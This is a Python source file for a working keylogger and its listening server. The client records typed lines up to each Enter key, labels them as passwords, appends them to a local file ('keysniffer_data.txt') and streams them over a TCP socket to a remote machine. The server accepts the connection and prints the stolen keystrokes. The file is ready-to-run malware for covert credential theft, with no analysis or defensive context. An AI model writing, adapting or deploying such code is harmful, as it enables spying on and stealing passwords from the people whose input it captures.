import keyboard
import os
import socket

# IP and port of the remote computer (the receiver)
SERVER_IP = (
    "192.168.1.100"  # Replace with the actual IP address of the receiving machine
)
SERVER_PORT = 12345  # Choose an open port for the connection

# Set up a socket connection to send data to another computer
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))

# Defining the text file name and path (Optional, you can save data locally as well)
path = os.path.abspath("keysniffer_data.txt")

try:
    while True:
        with open(path, "a") as data_file:
            # All key presses are recorded as a list into "events"
            # and the record loop stops when the "enter" key is pressed
            events = keyboard.record("enter")
            password = list(keyboard.get_typed_strings(events))

            # Write captured keystrokes to the local file
            data_file.write("\n")  # New line before writing data
            data_file.write(password[0])

            # Send the captured keystrokes to the remote computer via the socket
            client_socket.sendall(
                password[0].encode("utf-8")
            )  # Send keystrokes as bytes

except KeyboardInterrupt:
    print("Keylogger stopped.")
finally:
    client_socket.close()


# server part
import socket

# IP and port to listen on (make sure to match the receiving machine's IP and port)
HOST = "0.0.0.0"  # Listen on all available network interfaces
PORT = 12345  # Use the same port number as the keylogger's server

# Create a socket for receiving the data
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print(f"Listening for incoming connections on {HOST}:{PORT}...")

# Accept incoming connection from the keylogger
client_socket, client_address = server_socket.accept()
print(f"Connection established with {client_address}")

# Receive and print the keystrokes
try:
    while True:
        data = client_socket.recv(1024)  # Receive up to 1024 bytes of data at a time
        if not data:
            break  # If no data is received, exit the loop
        print(
            f"Received keystroke: {data.decode('utf-8')}"
        )  # Print the received keystroke
finally:
    print("Closing connection.")
    client_socket.close()  # Close the connection when done
    server_socket.close()  # Close the server socket
